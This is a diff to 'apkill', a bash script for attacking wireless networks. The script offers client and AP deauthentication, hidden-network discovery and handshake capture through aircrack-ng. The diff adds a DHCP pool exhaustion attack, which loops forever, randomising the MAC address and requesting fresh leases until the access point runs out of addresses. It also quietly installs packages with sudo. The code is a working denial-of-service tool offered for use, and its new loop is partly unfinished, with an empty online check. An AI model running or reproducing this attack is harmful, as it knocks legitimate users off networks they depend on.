@@ -1,8 +1,9 @@
 #!/bin/bash
 # https://github.com/deadport/apkill
 # Warning: this is noob scripting, tipps on how things can be done better are welcome, thanks.
-# Dependencies: net-tools, egrep, aircrack-ng
-#dependency check
+# Dependencies: net-tools, egrep, aircrack-ng, macchanger
+
+#dependency check 
 chan=0
 if [ ! -d '/etc/apt' ]
 	then
@@ -24,8 +25,13 @@ if [ ! -f '/sbin/iwlist' ]
 		echo "loading net-tools.."
 		sudo apt install net-tools -y > /dev/null
 fi
+if [ ! -f '/bin/macchanger' ]
+	then
+		echo "loading macchanger.."
+		sudo apt install macchanger -y > /dev/null
+fi
 echo "dependency check done.." && clear
-#end of dependencie check
+#end of dependencie check 
 clear
 #artwork
 tput setaf 1
@@ -44,9 +50,10 @@ echo "								                                        "
 tput sgr0
 #artwork end
 #opt
-echo "Choose an attack option [single client(1) whole AP(2) find hidden(3) get handshakes(4)]:"
+echo "Choose an attack option:	[single client(1) whole AP(2) find hidden(3) get handshakes(4)	]"
+echo "							[DHCP pool attack (5)											]"
 read ask
-if [ $ask -gt 4 ] || [ $ask -lt 1 ]
+if [ $ask -gt 5 ] || [ $ask -lt 1 ]
 	then
 		tput setaf 1
 		echo "This option does not exist!"
@@ -157,4 +164,51 @@ if [ $ask -eq 4 ]
 				tput sgr0
 		fi
 		sudo airmon-ng stop $monitor > /dev/null
+fi
+if [ $ask -eq 5 ]
+	then 
+		pass=0
+		essid=0
+		online=1
+		echo "To successfully perform this attack you must be able to login to the destination AP!"
+		echo "	"
+		echo "scanning.." && sudo iwlist $inter scan | egrep 'Address|ESSID|Quality'
+		echo "choose AP ESSID:" && read essid
+		echo "Password:" && read -s pass
+		iwconfig
+		echo "Interface to use:" && read inter
+		if [ $essid = 0 ]
+			then
+				echo "This field can not be empty"
+				exit 1
+		fi
+		if [ $pass -eq 0 ]
+			then
+				iwconfig $inter $essid
+			else
+				iwconfig $inter $essid s:$pass
+		fi
+		dhclient $inter
+		sleep 1
+		gate=$(/sbin/ip route | awk '/default/ { print $3 }')
+		#start dhcp pool flooding
+		while [ $online -eq 1 ]
+			do
+				sudo /etc/init.d/networking restart > /dev/null
+				sleep 2
+				if [ $pass -eq 0 ]
+					then
+						iwconfig $inter $essid
+					else
+						iwconfig $inter $essid s:$pass
+				fi
+				macchanger -a > /dev/null
+				sleep 3
+				dhclient $inter
+				#check online start 
+				
+				#check online end
+		done
+		#end dhcp pool flooding 
+		
 fi
